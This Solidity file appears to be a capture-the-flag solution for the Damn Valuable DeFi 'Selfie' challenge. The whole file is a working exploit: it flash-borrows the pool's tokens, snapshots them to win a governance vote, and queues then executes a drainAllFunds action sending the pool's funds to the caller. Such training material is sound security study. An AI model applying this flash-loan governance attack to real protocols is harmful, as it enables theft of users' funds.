// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";

contract ExploitSelfiePool {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public governance;

    uint256 public actionId;

    constructor(
        address _token,
        address _pool,
        address _governance
    ) {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    // Need to have receiveTokens because that is what flashLoan calls
    // Can do the same with fallback
    fallback() external payable {
        // Take a snapsot
        token.snapshot();

        // Transfer back the tokens for a complete flashLoan
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function attack() public {
        // Borrow all the DVT tokens in the pool contract
        pool.flashLoan(token.balanceOf(address(pool)));

        // After fallback is called
        // In the Governance contract, this contract has more votes
        // So it is able to queue and execute actions
        // First queue an action to drain all funds
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(msg.sender)
            ),
            0
        );
    }

    function attackAfterTwoDays() public {
        governance.executeAction(actionId);
    }
}
